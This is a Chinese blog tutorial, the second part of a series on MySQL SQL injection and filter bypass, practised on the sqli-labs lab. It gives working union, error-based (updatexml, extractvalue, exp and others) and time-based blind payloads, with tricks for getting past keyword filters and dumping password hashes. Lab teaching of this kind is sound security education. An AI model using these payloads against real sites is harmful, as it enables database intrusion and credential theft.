<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>ğŸ’‰ SQLi_BYPASS_for_mysql Vol.2 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">ğŸ’‰ SQLi_BYPASS_for_mysql Vol.2</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>23 Minutes</li><li><i class="icon icon-calendar"></i>January 7, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="ğŸ’‰-SQLi-BYPASS-for-mysql-Vol-2"><a href="#ğŸ’‰-SQLi-BYPASS-for-mysql-Vol-2" class="headerlink" title="ğŸ’‰ SQLi_BYPASS_for_mysql Vol.2"></a><center>ğŸ’‰ <em>SQLi_BYPASS_for_mysql Vol.2</em></center></h2><h3 id="ç›®å½•"><a href="#ç›®å½•" class="headerlink" title="ç›®å½•"></a>ç›®å½•</h3><ul>
<li>æƒ…æŠ¥æ”¶é›†</li>
<li>æ³¨å…¥ <em>BYPASS</em> å…¥é—¨</li>
<li>æŠ¥é”™æ³¨å…¥</li>
<li>ç›²æ³¨<ul>
<li>æ—¶é—´ç›²æ³¨</li>
<li>å¸ƒå°”ç›²æ³¨</li>
</ul>
</li>
</ul>
<h3 id="ğŸ™ï¸-0x00-å‰è¨€"><a href="#ğŸ™ï¸-0x00-å‰è¨€" class="headerlink" title="ğŸ™ï¸ 0x00 å‰è¨€"></a>ğŸ™ï¸ 0x00 å‰è¨€</h3><p>æ¥ç€ä¸Šä¸€ç¯‡ç»§ç»­ã€‚</p>
<h3 id="0x15-æ•°æ®åº“æƒ…æŠ¥æ”¶é›†"><a href="#0x15-æ•°æ®åº“æƒ…æŠ¥æ”¶é›†" class="headerlink" title="0x15 æ•°æ®åº“æƒ…æŠ¥æ”¶é›†"></a>0x15 æ•°æ®åº“æƒ…æŠ¥æ”¶é›†</h3><h4 id="æ•°æ®åº“ç‰ˆæœ¬ä¸è·¯å¾„ä¿¡æ¯æ”¶é›†"><a href="#æ•°æ®åº“ç‰ˆæœ¬ä¸è·¯å¾„ä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•°æ®åº“ç‰ˆæœ¬ä¸è·¯å¾„ä¿¡æ¯æ”¶é›†"></a>æ•°æ®åº“ç‰ˆæœ¬ä¸è·¯å¾„ä¿¡æ¯æ”¶é›†</h4><p>æ”¶é›†æ•°æ®åº“çš„ç‰ˆæœ¬ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select version();</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@version;</span><br><span class="line"></span><br><span class="line">/*!ç‰ˆæœ¬å·*/</span><br><span class="line">/*!*/ æ„ä¸ºåœ¨ xxx ç‰ˆæœ¬ä¹‹ä¸Šè¿›è¡Œ</span><br></pre></td></tr></table></figure>

<p><code>select * from admin union select 1,version(),3;</code></p>
<p><code>select * from admin union select 1,@@version,3;</code></p>
<p><code>select * from admin union select 1,/*!40000 user()*/,3;</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.01.05.jpg" alt="Screenshot 2020-02-15 ä¸‹åˆ5.01.05"></p>
<p>è·¯å¾„ä¸€èˆ¬ç”¨ <code>@@datadir</code>ï¼Œç„¶åå¯ä»¥åçŒœç½‘ç«™çš„è·¯å¾„ã€‚æ“ä½œç³»ç»Ÿå¯ä»¥ç”¨ <code>@@version_compile_os</code> æ¥çŒœè§£ã€‚</p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.04.441.jpg" alt="Screenshot 2020-02-15 ä¸‹åˆ5.04.44"></p>
<h4 id="ç”¨æˆ·ã€è¿æ¥ä¿¡æ¯"><a href="#ç”¨æˆ·ã€è¿æ¥ä¿¡æ¯" class="headerlink" title="ç”¨æˆ·ã€è¿æ¥ä¿¡æ¯"></a>ç”¨æˆ·ã€è¿æ¥ä¿¡æ¯</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">system_user() ç³»ç»Ÿç”¨æˆ·å</span><br><span class="line">user() 	ç”¨æˆ·å</span><br><span class="line">current_user() å½“å‰ç”¨æˆ·å</span><br><span class="line">session_user() è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å</span><br></pre></td></tr></table></figure>

<p><code>select * from admin union select system_user(),current_user(),session_user();</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.09.14.jpg" alt="Screenshot 2020-02-15 ä¸‹åˆ5.09.14"></p>
<h4 id="è¯»å–-host-ä¿¡æ¯åŠ-user-ä¿¡æ¯"><a href="#è¯»å–-host-ä¿¡æ¯åŠ-user-ä¿¡æ¯" class="headerlink" title="è¯»å– host ä¿¡æ¯åŠ user ä¿¡æ¯"></a>è¯»å– host ä¿¡æ¯åŠ user ä¿¡æ¯</h4><p><code>select * from admin where id=1 union select 1,host,user from mysql.user;</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-15%20%E4%B8%8B%E5%8D%885.14.33.jpg" alt="Screenshot 2020-02-15 ä¸‹åˆ5.14.33"></p>
<p>è¿™é‡Œç”¨åˆ°äº†ä¸Šä¸€ç¯‡ä¸­è®²åˆ°çš„ mysql åº“ï¼Œå…¶ä¸­åŒ…å«äº† user/host/password ç­‰ä¿¡æ¯ã€‚</p>
<p>âš ï¸ <strong>æ³¨æ„</strong></p>
<p>é€šè¿‡ host ç™»å½•è¿™ä¸ªä¿¡æ¯è¿˜å¯ä»¥åˆ¤æ–­è¯¥ç«™æ˜¯å¦æ˜¯ç«™åº“åˆ†ç¦»ç­‰ç­‰ã€‚</p>
<h3 id="0x16-æ³¨å…¥-BYPASS-å…¥é—¨"><a href="#0x16-æ³¨å…¥-BYPASS-å…¥é—¨" class="headerlink" title="0x16 æ³¨å…¥ BYPASS å…¥é—¨"></a>0x16 æ³¨å…¥ <em>BYPASS</em> å…¥é—¨</h3><h4 id="ç®€å•æ³¨å…¥"><a href="#ç®€å•æ³¨å…¥" class="headerlink" title="ç®€å•æ³¨å…¥"></a>ç®€å•æ³¨å…¥</h4><p>é’ˆå¯¹ sqli-labs lesson1 æ¥ç»ƒä¹ ã€‚</p>
<p>ä¸€å¼€å§‹çš„å¥—è·¯å…¶å®éƒ½å·®ä¸å¤šï¼Œå…ˆå°è¯•å•å¼•å· <code>&#39;</code>ï¼Œåæ–œæ  <code>\</code> ç­‰ç¬¦å·æŠ¥é”™ï¼Œç„¶å <code>and 1=1</code>/<code>and &#39;1&#39;=&#39;1</code>ã€<code>and 1=2</code>/<code>and &#39;1&#39;=&#39;2</code>ï¼Œçœ‹å›æ˜¾æ˜¯å¦æœ‰æŠ¥é”™ã€‚</p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.01.01.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ6.01.01"></p>
<p>æˆ‘ä»¬å…ˆæ¥çœ‹æŠ¥é”™ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code> è¡¨ç¤ºæœ€å¤–å±‚å‡ºé”™çš„è¯­å¥ï¼Œæ‰€ä»¥æˆ‘ä»¬åº”è¯¥çœ‹çš„æ˜¯ <code>&#39;1&#39;&#39; LIMIT 0,1</code>ï¼Œè¯´æ˜å•å¼•å·æ²¡æœ‰é—­åˆé€ æˆäº†å‡ºé”™ï¼ŒåŒæ—¶æˆ‘ä»¬ä¹ŸçŸ¥é“äº†è¿™æ¡è¯­å¥åé¢è¿˜æœ‰ä¸ª <code>limit 0,1</code> è¡¨ç¤ºä»ç¬¬ 0 è¡Œå¼€å§‹åªæ˜¾ç¤ºä¸€è¡Œã€‚</p>
<p>ä»å¾—åˆ°çš„ä¿¡æ¯æˆ‘ä»¬å¯ä»¥åæ¨å¤§æ¦‚çš„è¯­å¥å¯èƒ½æ˜¯ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select xx from xx where xx=&apos;?id&apos; limit 0,1</span><br></pre></td></tr></table></figure>

<p>æ¥ç€ order by åˆ¤æ–­åˆ—æ•°ï¼Œå› ä¸º order by è¿™ä¸ªè¯­å¥æœ¬æ¥å°±æ˜¯ä¾ç…§ç¬¬å‡ åˆ—æ¥æ’åºï¼Œå¦‚æœè¶…å‡ºäº†åˆ—æ•°è‡ªç„¶ä¹Ÿå°±ä¼šæŠ¥é”™ï¼Œå¾—åˆ°åˆ—æ•°ä¸º 3ã€‚</p>
<p>åˆ¤æ–­å‡ºåˆ—æ•°ä¹‹åå°±ç›´æ¥ä¸Š union select è”åˆæŸ¥è¯¢ã€‚</p>
<p><code>?id=-1&#39; union select 1,database(),user() limit 0,1 -- +</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.11.52.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ6.11.52"></p>
<p>ç„¶åæŒ‰ä¹‹å‰çš„æ­¥éª¤è¿›è¡Œæƒ…æŠ¥æ”¶é›†ã€dump æ•°æ®ã€‚</p>
<p><code>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x7365637572697479 limit 0,1 -- +</code></p>
<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%886.16.31.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ6.16.31"></p>
<p><code>group_concat()</code> å‡½æ•°ä½¿æŸ¥è¯¢çš„å†…å®¹ä»¥å­—ç¬¦ä¸²è¿”å›ï¼Œ<code>0x7c</code> hex è§£ç å¾—åˆ° <code>|</code>ï¼Œè·¯å¾„ä½ç½® hex ç¼–ç é¿å…å•å¼•å·ã€‚</p>
<h5 id="ğŸš¨-BYPASS"><a href="#ğŸš¨-BYPASS" class="headerlink" title="ğŸš¨ BYPASS"></a>ğŸš¨ <em>BYPASS</em></h5><ol>
<li><p>å¦‚æœ <code>group_concat()</code> å‡½æ•°è¢«è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å…¶ä»–å‡½æ•°æ¥ä»£æ›¿ï¼Œå¯ä»¥æŸ¥é˜… mysql å‡½æ•°è¡¨ã€‚</p>
</li>
<li><p>é€šè¿‡ <code>limit 0,1</code> æ¥æ§åˆ¶å‰ç«¯æ˜¾ç¤ºçš„æ•°æ®ï¼Œå¦‚æœç›®æ ‡è¿‡æ»¤äº†é€—å·ï¼Œå¯ä»¥ç”¨ <code>limit 1 offset 0</code> æ¥æ§åˆ¶ã€‚æˆ–è€… join åˆ†é¡µã€‚</p>
</li>
<li><p>å¦‚æœæƒ³è¦çˆ†å½“å‰æ•°æ®åº“çš„è¡¨ï¼Œä¹Ÿå¯ä»¥æ„é€ æˆ <code>table_schema=database()</code>ã€‚é¿å…å•å¼•å·æ¨èä½¿ç”¨ hex ç¼–ç ã€‚</p>
</li>
<li><p>å¦‚æœ <code>information_schema.schemata</code> è¢«æ‹¦æˆªäº†ï¼Œå¯ä»¥ç”¨åˆ«çš„æ–¹å¼ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">`information_schema`.`schemata `  </span><br><span class="line">information_schema/**/.schemata</span><br><span class="line">information_schema/*!*/.schemata</span><br><span class="line">information_schema%0a.schemata</span><br></pre></td></tr></table></figure>
</li>
<li><p>å¦‚æœ users è¡¨è¢«æ‹¦æˆªï¼ŒåŒç†ä¹Ÿç”¨è¿™ä¸ªæ–¹æ³•ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">security.`users`</span><br></pre></td></tr></table></figure>

</li>
</ol>
<h3 id="0x17-æŠ¥é”™æ³¨å…¥"><a href="#0x17-æŠ¥é”™æ³¨å…¥" class="headerlink" title="0x17 æŠ¥é”™æ³¨å…¥"></a>0x17 æŠ¥é”™æ³¨å…¥</h3><p>åœ¨ä¸èƒ½ä½¿ç”¨ union select è”åˆæŸ¥è¯¢çš„æ—¶å€™ï¼ŒæŠ¥é”™æ³¨å…¥æ˜¯éå¸¸é‡è¦çš„ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">1.floor()</span><br><span class="line">select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2.extractvalue()</span><br><span class="line">select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.updatexml()</span><br><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4.geometrycollection()</span><br><span class="line">select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5.multipoint()</span><br><span class="line">select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6.polygon()</span><br><span class="line">select * from test where id=1 and polygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7.multipolygon()</span><br><span class="line">select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8.linestring()</span><br><span class="line">select * from test where id=1 and linestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">9.multilinestring()</span><br><span class="line">select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));</span><br><span class="line"></span><br><span class="line">10.exp()</span><br><span class="line">select * from test where id=1 and exp(~(select * from(select user())a));</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªæŠ¥é”™è¯­å¥éƒ½æœ‰å®ƒæœ¬èº«çš„æŠ¥é”™åŸç†ã€‚</p>
<p>æ¯”å¦‚ <code>exp()</code> æŠ¥é”™çš„åŸç†ï¼Œ<code>exp()</code> æ˜¯ä¸€ä¸ªæ•°å­¦å‡½æ•°ï¼Œå– e çš„ x æ¬¡æ–¹ï¼Œå½“æˆ‘ä»¬è¾“å…¥çš„å€¼å¤§äº 709 å°±ä¼šæŠ¥é”™ï¼Œç„¶å ~ å–åå®ƒçš„å€¼æ€»ä¼šå¤§äº 709 æ‰€ä»¥æŠ¥é”™ã€‚</p>
<p>åˆ©ç”¨æŠ¥é”™è¯­å¥æ¥æ³¨å…¥ï¼Œè¿™é‡Œåˆ©ç”¨ <code>updatexml()</code> æ¥æ¼”ç¤ºã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">updatexml (XML_document, XPath_string, new_value); </span><br><span class="line">XML_document: æ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc </span><br><span class="line">XPath_string : Xpath</span><br><span class="line">new_value :Stringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®</span><br></pre></td></tr></table></figure>

<p><code>select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</code></p>
<p>å…¶ä¸­å…³é”®ç‚¹æ˜¯ <code>XPath_string</code>ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ å…¥çš„ä¸æ˜¯ <code>XPath_string</code>ã€‚ä¸ºä»€ä¹ˆè¦ç”¨ <code>concat()</code> å‡½æ•°å‘¢ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªè¿æ¥å‡½æ•°ï¼Œå¦‚æœä¸ç”¨çš„è¯ï¼š<code>(updatexml(1,(select user()),1))</code> è¿™æ ·ä¹Ÿå¯ä»¥ï¼Œä½†æ˜¯éœ€è¦å­—ç¬¦ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦æ‰ä¼šæŠ¥é”™ï¼ŒåŒæ—¶å®ƒä¼šè¢«ä¸­é—´çš„ç‰¹æ®Šå­—ç¬¦æˆªæ–­ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ° <code>concat()</code> å‡½æ•°ç”¨ç‰¹æ®Šå­—ç¬¦è¿æ¥èµ·æ¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// çŒœè§£åº“</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +</span><br><span class="line"></span><br><span class="line">// çŒœè§£è¡¨</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (table_name),0x7e) FROM information_schema.tables where table_schema=0x7365637572697479 limit 0,1),1) -- +</span><br><span class="line"></span><br><span class="line">// çŒœè§£åˆ—</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (column_name),0x7e) FROM information_schema.columns where table_schema=0x7365637572697479 and table_name=0x7573657273 limit 0,1),1) -- +</span><br><span class="line"></span><br><span class="line">// çŒœè§£æ•°æ®</span><br><span class="line">?id=1&apos; and updatexml(1,(select concat(0x7e, (password),0x7e) FROM security.users where username=0x44756d62 limit 0,1),1) -- +</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.02.15.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ7.02.15"></p>
<center>çŒœè§£åº“å</center>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.07.54.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ7.07.54"></p>
<center>çŒœè§£è¡¨å</center>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.10.21.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ7.10.21"></p>
<center>çŒœè§£åˆ—å</center>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%887.16.15.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ7.16.15"></p>
<center>çˆ†ç ´æ•°æ®</center>

<p>åœ¨æŠ¥é”™ä¸­ç›´æ¥ä½¿ç”¨ mysql æœ€åŸºæœ¬çš„æŸ¥è¡¨å°±å¯ä»¥äº†ï¼Œä¹Ÿå¯ä»¥æŠŠ concat æ”¾åœ¨å¤–é¢ï¼š<code>updatexml(1,concat(0x7e,(select password from users limit 1,1),0x7e),1)</code></p>
<p>âš ï¸ å€¼å¾—æ³¨æ„çš„æ˜¯åŠ äº†è¿æ¥å­—ç¬¦ md5 åªèƒ½çˆ†å‡º 31 ä½ï¼Œè¿™é‡Œå¯ä»¥ç”¨åˆ†å‰²å‡½æ•°åˆ†å‰²å‡ºæ¥ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.232.140/sqli-labs/Less-1/?id=1&apos; and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåˆ©ç”¨ md5 åŠ å¯†æ¥åˆ†å‰²ã€‚</p>
<h3 id="0x18-ç›²æ³¨"><a href="#0x18-ç›²æ³¨" class="headerlink" title="0x18 ç›²æ³¨"></a>0x18 ç›²æ³¨</h3><p>ç›²æ³¨è¿™é‡Œå½’çº³ä¸º<strong>æ—¶é—´ç›²æ³¨</strong>å’Œ<strong>å¸ƒå°”ç›²æ³¨</strong>ã€‚</p>
<p>ç›²æ³¨çš„æœ¬è´¨æ˜¯<strong>çŒœè§£</strong>ï¼šæ‰€è°“ã€Œç›²ã€å°±æ˜¯åœ¨çœ‹ä¸åˆ°è¿”å›æ•°æ®çš„æƒ…å†µä¸‹é€šè¿‡ã€Œæ„Ÿè§‰ã€æ¥åˆ¤æ–­ï¼Œé‚£ä¹ˆæ€ä¹ˆæ„Ÿè§‰å‘¢ï¼Ÿå°±æ˜¯ã€Œå·®å¼‚ã€ã€‚åŒ…æ‹¬è¿è¡Œæ—¶é—´çš„å·®å¼‚å’Œé¡µé¢è¿”å›ç»“æœçš„å·®å¼‚åˆ†ä¸ºæ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨ã€‚</p>
<p>åœ¨å¦‚ä»Šçš„çœŸå®ç¯å¢ƒä¸­ç›²æ³¨çš„æƒ…å†µæ¯”è¾ƒå¤šï¼Œä½†æ˜¯æ—¶é—´ç›²æ³¨å¤ªè´¹æ—¶é—´ï¼ŒåŒæ—¶å¯¹ç½‘ç»œçš„è¦æ±‚æ¯”è¾ƒé«˜ã€‚äºŒåˆ†ã€dnslog ç­‰ç­‰éƒ½å¯ä»¥åŠ å¿«æ³¨å…¥çš„è¿‡ç¨‹ã€‚</p>
<h4 id="âš ï¸-ç›²æ³¨ä¸­éœ€è¦æ³¨æ„çš„é—®é¢˜"><a href="#âš ï¸-ç›²æ³¨ä¸­éœ€è¦æ³¨æ„çš„é—®é¢˜" class="headerlink" title="âš ï¸ ç›²æ³¨ä¸­éœ€è¦æ³¨æ„çš„é—®é¢˜"></a>âš ï¸ ç›²æ³¨ä¸­éœ€è¦æ³¨æ„çš„é—®é¢˜</h4><ol>
<li>ç›²æ³¨ä¸­ä½¿ç”¨ and éœ€è¦ç¡®å®šæŸ¥è¯¢çš„å€¼æ˜¯å­˜åœ¨çš„ã€‚</li>
<li>åœ¨è¿”å›å¤šç»„æ•°æ®çš„æƒ…å†µä¸‹ï¼Œå»¶æ—¶ä¸å†æ˜¯å•çº¯çš„ <code>sleep(5)</code>ï¼Œç¨‹åºå°†æ ¹æ®è¿”å›çš„æ•°æ®æ¡æ•°æ¥åå¤æ‰§è¡Œã€‚</li>
<li>å°½é‡æœç´¢å­˜åœ¨ä¸”æ•°ç›®è¾ƒå°‘çš„å…³é”®è¯ã€‚</li>
<li>å°½é‡ä¸è¦ä½¿ç”¨ orã€‚</li>
</ol>
<h4 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h4><p>ç›²æ³¨æ˜¯é€šè¿‡è¿”å›æ•°æ®çš„æ—¶é—´æ¥åˆ¤æ–­ payload ä¸­çš„å†…å®¹æ˜¯å¦æ­£ç¡®ã€‚</p>
<p>æ—¶é—´ç›²æ³¨ä¹Ÿå«å»¶æ—¶æ³¨å…¥ï¼Œä¸€èˆ¬ç”¨åˆ°å‡½æ•° <code>sleep()</code> <code>BENCHMARK()</code>å‡½æ•°ã€‚è¿˜å¯ä»¥ä½¿ç”¨ç¬›å¡å°”ç§¯ï¼ˆå°½é‡ä¸è¦ä½¿ç”¨ï¼Œå†…å®¹å¤ªå¤šä¼šå¾ˆæ…¢å¾ˆæ…¢ï¼‰ã€‚</p>
<p><strong>ä¸€èˆ¬æ—¶é—´ç›²æ³¨è¿˜éœ€è¦ä½¿ç”¨æ¡ä»¶åˆ¤æ–­å‡½æ•°ã€‚</strong></p>
<p>å»ºè®®æŠŠåˆ†å‰²çš„å‡½æ•°ç¼–ç ä¸€ä¸‹ï¼Œè¿™æ ·å¯ä»¥é¿å…ä½¿ç”¨å¼•å·ï¼Œå¸¸ç”¨åˆ°çš„æœ‰ <code>ascii()</code> <code>hex()</code>ç­‰ç­‰ã€‚</p>
<p><code>benchmark()</code> çš„ä½œç”¨æ˜¯æ¥æµ‹è¯•ä¸€äº›å‡½æ•°çš„æ‰§è¡Œé€Ÿåº¦ã€‚<code>benchmark()</code> ä¸­å¸¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯æ‰§è¡Œçš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªæ˜¯è¦æ‰§è¡Œçš„å‡½æ•°æˆ–è€…æ˜¯è¡¨è¾¾å¼ã€‚</p>
<p>ä»æœ€ç®€å•çš„ç›²æ³¨å¼€å§‹ï¼š</p>
<h5 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a><em>sleep()</em></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// åˆ¤æ–­å½“å‰ç”¨æˆ·çš„ç”¨æˆ·åï¼Œä»ç¬¬ä¸€ä½å¼€å§‹</span><br><span class="line">mysql&gt; select * from users where id=1 and if((substr((select user()),1,1)=&apos;r&apos;),sleep(5),id=1);</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.42.58.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ9.42.58"></p>
<h5 id="benchmark"><a href="#benchmark" class="headerlink" title="benchmark()"></a><em>benchmark()</em></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// åˆ¤æ–­å½“å‰ç”¨æˆ·çš„ç”¨æˆ·åå‰ä¸¤ä½</span><br><span class="line">mysql&gt; select * from users where id=1 and if((substr((select user()),1,2)=&apos;ro&apos;),benchmark(20000000,md5(&apos;a&apos;)),id=1);</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%889.54.09.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ9.54.09"></p>
<h5 id="case-when-then-else-end"><a href="#case-when-then-else-end" class="headerlink" title="case when then else end"></a><em>case when then else end</em></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// åˆ¤æ–­å½“å‰ç”¨æˆ·çš„ç”¨æˆ·å</span><br><span class="line">mysql&gt; select * from users where id=1 and case when (substr((select user()),1,4)=&apos;root&apos;) then sleep(5) else id=1 end;</span><br></pre></td></tr></table></figure>

<p><img src="http://47.95.140.43/tu/sqli_bypass2/Screenshot%202020-02-16%20%E4%B8%8B%E5%8D%8810.03.30.jpg" alt="Screenshot 2020-02-16 ä¸‹åˆ10.03.30"></p>
<p>ä¸æ¨èä½¿ç”¨ç¬›å¡å°”ç§¯ï¼Œå½“æ•°æ®è¿‡å¤šæ—¶ä¼šé€ æˆ DDOSã€‚</p>
